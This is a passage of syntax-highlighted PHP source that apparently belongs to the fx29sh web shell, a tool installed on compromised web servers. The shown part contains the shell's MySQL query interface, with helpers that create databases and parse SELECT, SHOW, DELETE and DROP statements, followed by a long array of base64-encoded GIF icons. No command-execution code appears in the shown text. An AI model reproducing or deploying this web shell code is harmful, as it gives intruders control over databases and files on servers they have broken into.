      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot;+ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.fx29sh_sqlquery.sql_query.value+=&#39;`&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;`&#39;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_create_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$sock</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;CREATE DATABASE `&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">mysql_query_parse</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$query</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
  <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
  <span class="nv">$types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s2">&quot;SELECT&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
    <span class="s2">&quot;SHOW&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
    <span class="s2">&quot;DELETE&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
    <span class="s2">&quot;DROP&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="p">);</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$op</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;propertions&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">];</span>
    <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;query&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;LIMIT&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
          <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);}</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">],</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="c1">###[ END OF MYSQL FUNCTIONS ]###</span>
<span class="c1">###[ IMAGES ]###</span>
<span class="k">function</span> <span class="nf">imagez</span><span class="p">()</span> <span class="p">{</span>
  <span class="nv">$images</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;home&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEwAYALMJAH6+91OZ97zp/l6x/Y/V/iVr7DGQ/QwxyAEKpP///wAAAAAAAAAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwkALAAAAAATABgAAASoMEkJwrwYAyEqyFkQcFwFTuJAkF1xDkExAARdAy4W4EUw&#39;</span><span class="o">.</span>
<span class="s1">&#39;zwAALEfhFQy+5AAWmwwLUIN0OhPlBjLocSpdDgzYBLYnjXa/U1fMQD6auWzxMQBmn0XpBJ6OB6fs&#39;</span><span class="o">.</span>
<span class="s1">&#39;cXwiPl5LBwgIdGqDhV4FiImBKV5CQQGQPjlgS0GVMJBfRD5BBDU1l4g+BxcGNqYEAQeHBasYBqW4&#39;</span><span class="o">.</span>
<span class="s1">&#39;sLK1IAUcK7onFwWlOMIZB0THyxgRADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;buffer&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAWALMJABo+qGql77zK4OPw+pXE9Tx33mOCxx5WzYyv4v///wAAAAAAAAAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwkALAAAAAAYABYAAASbMMlJa0LFao0QMZslDMJFEEGhhtPgul4gFwebvK9BICnN&#39;</span><span class="o">.</span>
<span class="s1">&#39;4oPOACU7HAAb3Gl4mtGQltfSdSI+AdAWVVlNGbHZmxTYVB3BUOCI2vR+AQaQZL1lz74GhEAgn48I&#39;</span><span class="o">.</span>
<span class="s1">&#39;bCg0BwV7ewh9AgSGgEM9ASOGe32NiwFMAY0ukgZhU1WaOHxhE0tTQCR9GksIqHyqG4qnQbAsAkK0&#39;</span><span class="o">.</span>
<span class="s1">&#39;NhsFiLq+NhEAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;search&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAXAKIEAHl5ecbGxqCgoOvr6////wAAAAAAAAAAACH5BAHoAwQALAAAAAAYABcAAANq&#39;</span><span class="o">.</span>
<span class="s1">&#39;SLq88iK02UIM1kY67fgDhj3c4oGiKJRK9mUpycFpHQClHbw8zl2iEOjlo9SEw1DRuNsliaygMwlY&#39;</span><span class="o">.</span>
<span class="s1">&#39;di7PgcDKUD2moW1utAVAHtUS9maGmLkOTBiudrJZk3Uaz4gQ6XUYe3wNb4CEiImKCQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;back&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAYALMJAC9ILkesPbHdo3W0Zi2IJ+f141aOUTRoM4LKdP///wAAAAAAAAAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwkALAAAAAAYABgAAASwMMlJq7046zSM/8YmeYNgFiZiHMdmCEVszoIaXscLpwhC&#39;</span><span class="o">.</span>
<span class="s1">&#39;dy2LASETlAoBXw8xCFYMqNQuWesBK4OjkVgYLL8B52h2LCCS2WxgECAAJiteLNarMtduOEE678/P&#39;</span><span class="o">.</span>
<span class="s1">&#39;bW8jBzVefigybIEUQz0BMF0EAZOTkm6CEgCNbFOUngR5FAdLazCAlKChomt3ASiolpiMB5OKbJZt&#39;</span><span class="o">.</span>
<span class="s1">&#39;oLIVtJ6VuaoXAAepxbq7GcTFAMgbzM/NItLTGxEAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;forward&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAYAKIGAB9fHVu2T7nirIbKdjaXL+z36P///wAAACH5BAHoAwYALAAAAAAYABgAAAOc&#39;</span><span class="o">.</span>
<span class="s1">&#39;aLrc/g1ICSsZIosRSGWXUGjaQAAfIY7Z4GIc+qgFy734+Qxsy2+BV8dBGPVeI04wEJAtfiSgSMCs&#39;</span><span class="o">.</span>
<span class="s1">&#39;Og2AEu5Wo1Z1iuwGsymvChxCxynG1N7wWocAxmaCGVZcQKezYVVfPCNzJ1cBYzdMF4R9dWEwQkFy&#39;</span><span class="o">.</span>
<span class="s1">&#39;hY8KF5KIaI6WYUGKS5ydYReBapxXDgBqpn0UH2Grjq+wDBMTtbm6uwsJADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;up&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAXAKIGABxXG0irPrLeo3zFbzWFMOLz3v///wAAACH5BAHoAwYALAAAAAAYABcAAAOP&#39;</span><span class="o">.</span>
<span class="s1">&#39;aLrc/jBKMoa4lRCp6C1XOASbNBQgVq1D6XipsAYs+RCoAFZ5QNMEQIOSq+hQO59PyAjoMEckauQL&#39;</span><span class="o">.</span>
<span class="s1">&#39;MnBQaS5JYnZ2Tx6INu5ed5bRqUClmhcEEU3srlrhIZlsXSe8OxZ6K1NKJAFecIEshFV/CwBONRiN&#39;</span><span class="o">.</span>
<span class="s1">&#39;dy9zFYVKGohDlz92AJw3mSRBohGhqaEcrK2uDgkAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;help&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhGAAYAKIGADlqzKjA6O3x932d3rPk/12Byv///wAAACH5BAHoAwYALAAAAAAYABgAAAOa&#39;</span><span class="o">.</span>
<span class="s1">&#39;aLor7ixK8+qb0eqLN/mENVlfYJpDUEkPMaSh474xwbTvsA3AEN8CV6GgEhR6Dh5SEFA8BkeASgmQ&#39;</span><span class="o">.</span>
<span class="s1">&#39;Aa4/igMQvXoLjoBXJ3AGu95rMQ0ua8Vpb5HKhWgJ8SsZfbVb8ypwaWRmRoACdHp2Wol5aTINW3Ep&#39;</span><span class="o">.</span>
<span class="s1">&#39;fHtAgn1MbByRmnKIXw8FLE9fV0ScEkVhKSYrGAqrG02wEa6stbm6CQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;change&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQALMMADMuME2f58e2ON7OMsXZ88wpTd/t/FhYU4x9erCwrIWSpW54iwAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwwALAAAAAAQABAAAARckMlJ6wQn6wMsW0QoBktXLUaaEkHAIYiJqiuhFAUg0yqR&#39;</span><span class="o">.</span>
<span class="s1">&#39;IAKdZMYzIAacCbGXEAyEQ0IvlEAeKCCDVJpompRbkUJzEokBi0XZTFgoCFfKwa1Q0NNxCmazz3v+&#39;</span><span class="o">.</span>
<span class="s1">&#39;DBEAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;delete&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIGAJIMJNMHLckjQURDQ2oqNigoKAAAAAAAACH5BAHoAwYALAAAAAAQABAAAANP&#39;</span><span class="o">.</span>
<span class="s1">&#39;KDHW/k4JBiuRFI5pilBE8RQX12yBIHYfMGTeNxQoMVfbJ7gZ5AWpV8VBU6SGkVSpR7zwdISKURgz&#39;</span><span class="o">.</span>
<span class="s1">&#39;dS4B2yMXMgyAWo2OBGQ6cq+NmbhJAAA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;download&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu&quot;</span><span class="o">.</span>
  <span class="s2">&quot;EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;setup&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC&quot;</span><span class="o">.</span>
  <span class="s2">&quot;QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA&quot;</span><span class="o">.</span>
  <span class="s2">&quot;ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB&quot;</span><span class="o">.</span>
  <span class="s2">&quot;qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE&quot;</span><span class="o">.</span>
  <span class="s2">&quot;OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;small_dir&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhDwAQALMPAAkJCXV3iEFvz5it4MXV8lFkqXaU2au+6EtMViQkJYGGq2JjcUFhunN3ljc3&#39;</span><span class="o">.</span>
<span class="s1">&#39;OQAAACH5BAHoAw8ALAAAAAAPABAAAARuEKDVVEsv64wO+UfjOBO1AM2nHsbQGkaDDCo43EdOVPW9&#39;</span><span class="o">.</span>
<span class="s1">&#39;ErmFgjDI6YyHm7AINN5cMESgSH3CBAKGo9GCwgxYrHbx/YbDYwEYfEY7Fu149s2QZxkFRQJRR+Mb&#39;</span><span class="o">.</span>
<span class="s1">&#39;AQsOAA98DH8NggCEGgmAiowbGREAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;small_unk&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIHABpFnoap3bTL89vq/FuCvVZlhH6Ms////yH5BAHoAwcALAAAAAAQABAAAANL&#39;</span><span class="o">.</span>
<span class="s1">&#39;eBfcrVCFQetgJS5bA/nRxFlGJlUFoBICZUDi6gGsYG5DWqntLZI8G4xDCApPHeMR5wL8lgbSE9rq&#39;</span><span class="o">.</span>
<span class="s1">&#39;OavUqurngTm+ntuhQC6byYcEADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;multipage&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR&quot;</span><span class="o">.</span>
  <span class="s2">&quot;pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;sort_asc&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa&quot;</span><span class="o">.</span>
  <span class="s2">&quot;SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;sort_desc&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb&quot;</span><span class="o">.</span>
  <span class="s2">&quot;SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_asp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/&quot;</span><span class="o">.</span>
  <span class="s2">&quot;/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI&quot;</span><span class="o">.</span>
  <span class="s2">&quot;D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_mp3&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAARALMPADE8XE6ekMSuNMDW7M1IRGRoZOXs9Ki31Y2HW3PEiFl2u19RX4ajzNmCeuew&#39;</span><span class="o">.</span>
<span class="s1">&#39;pwAAACH5BAHoAw8ALAAAAAAQABEAAASI8D1Gqy0yM8O7GRSmeR2oKOJEcgN4oJJyNExSD197iAjS&#39;</span><span class="o">.</span>
<span class="s1">&#39;OI2EkIFrYQqN3+cgRBA/iwLhh+MwE4HDYLeYGg4MLTNQCBi7joECcKKQC9tCV7tmhwoALV5BPMnA&#39;</span><span class="o">.</span>
<span class="s1">&#39;PXk7BSc5LA4CCAUHXCcHHogChIwYbG2RkgVhOxKWCggCkgCafCkAp6inBaurEQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_avi&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQALMMAAUFBY2OkM7T2UpKSqWoq+zz/GhoaSQkJLW4u1paWnp6ejY3NwAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwwALAAAAAAQABAAAARdkMkpgVGH6poIwttkeQUBbqNQrGZGjYG6lobLWAoixHOw&#39;</span><span class="o">.</span>
<span class="s1">&#39;GByDbpUrAQ6K2+AoW/0OyOMy4GtioozBgsAaqBDa08AwoxHCgMmPRzSM05R17x2SBxKn+uUCD0nW&#39;</span><span class="o">.</span>
<span class="s1">&#39;fRoRADs=&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_cgi&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIHAEhJS+q8D/7dNfnulpR/U5pqCtS5eP///yH5BAHoAwcALAAAAAAQABAAAANT&#39;</span><span class="o">.</span>
<span class="s1">&#39;eLpX/K9ISItwlElBcG5BMEFSGYolVgzsYAih0Q5FF7IwjAcdcRCE021wKQB8CqCQRQAcH4SXYOck&#39;</span><span class="o">.</span>
<span class="s1">&#39;EQUy2DMSMmaBEWITSBAjFZLxAliDghlkRQIAOw==&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_cmd&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI&quot;</span><span class="o">.</span>
  <span class="s2">&quot;eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN&quot;</span><span class="o">.</span>
  <span class="s2">&quot;dmrYAMn1onq/YKpjvEgAADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_cpp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra&quot;</span><span class="o">.</span>
  <span class="s2">&quot;Eq7YrLDE7a4SADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_ini&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL&quot;</span><span class="o">.</span>
  <span class="s2">&quot;aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM&quot;</span><span class="o">.</span>
  <span class="s2">&quot;SnEjgPVarHEHgrB43JvszsQEADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_diz&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQAKIHAAsZcWyPv7vT6eb0/ThOi1tukZyyy////yH5BAHoAwcALAAAAAAQABAAAANS&#39;</span><span class="o">.</span>
<span class="s1">&#39;eHrTLiu6IYh5chZAJlRTI4RDcIyacXkF6gAcWaxPLFJzaNhoZYyoXQcoCMwErgCHuFP8kEVjAGkg&#39;</span><span class="o">.</span>
<span class="s1">&#39;FBaqJ9CgvEYOBQK06/0qjlazuSBVr8uLBAA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_doc&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq&quot;</span><span class="o">.</span>
  <span class="s2">&quot;MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_exe&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt&quot;</span><span class="o">.</span>
  <span class="s2">&quot;xhIAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_h&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo&quot;</span><span class="o">.</span>
  <span class="s2">&quot;Wq/NknbbSgAAOw==&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_hpp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR&quot;</span><span class="o">.</span>
  <span class="s2">&quot;UqUagnbLdZa+YFcCADs=&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_htaccess&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
  <span class="s2">&quot;R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6&quot;</span><span class="o">.</span>
  <span class="s2">&quot;WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ&quot;</span><span class="o">.</span>
  <span class="s2">&quot;AAA7&quot;</span><span class="p">,</span>
  <span class="s2">&quot;ext_html&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhEAAQALMOAIyt016Itv///2Gp4uXy/c3P/MXl/mtrnC6Z4mfd/Chgk7PO9lBVhnNzc///&#39;</span><span class="o">.</span>
<span class="s1">&#39;/wAAACH5BAHoAw4ALAAAAAAQABAAAASF0EkHqq1h6nuzloAgjkIwfJRIFJVxFMgHDGYQCMihe46d&#39;</span><span class="o">.</span>
<span class="s1">&#39;/IiBIEEQFA4SkwHBZAaKK2RPAFAACM0nwTUFMAeD5mFBWCCpTIV6rSCbKQkFQpEw2A1lw4LRa84X&#39;</span><span class="o">.</span>
<span class="s1">&#39;cn96fAg4gQgJAwwAensOAyFzCgyTAAsFgxKQAywVBZcGn3wTDKWlDaamEQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_jpg&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhDgAQALMMACYlIC6NFLOxKnqIcbPIikWoIkVFRWllROLZUmO8NqKmoBBxCAAAAAAAAAAA&#39;</span><span class="o">.</span>
<span class="s1">&#39;AAAAACH5BAHoAwwALAAAAAAOABAAAARbMKxJ6zw2iGQHFSACCpQ3CWJISmaBCsABcouJiECOIkVg&#39;</span><span class="o">.</span>
<span class="s1">&#39;7gadiBXoAXc9X/LGRBASvUEPmiA4qUXpFPpMZrHQojchJZjDVOpgoGib3+82W8Gu0+nrGD2Y4wcN&#39;</span><span class="o">.</span>
<span class="s1">&#39;EQA7&#39;</span><span class="p">,</span>
  <span class="s2">&quot;ext_js&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s1">&#39;R0lGODlhDwAQAKIEAB4eHZ6eaOLih2BgWQAAAAAAAAAAAAAAACH5BAHoAwQALAAAAAAPABAAAANP&#39;</span><span class="o">.</span>
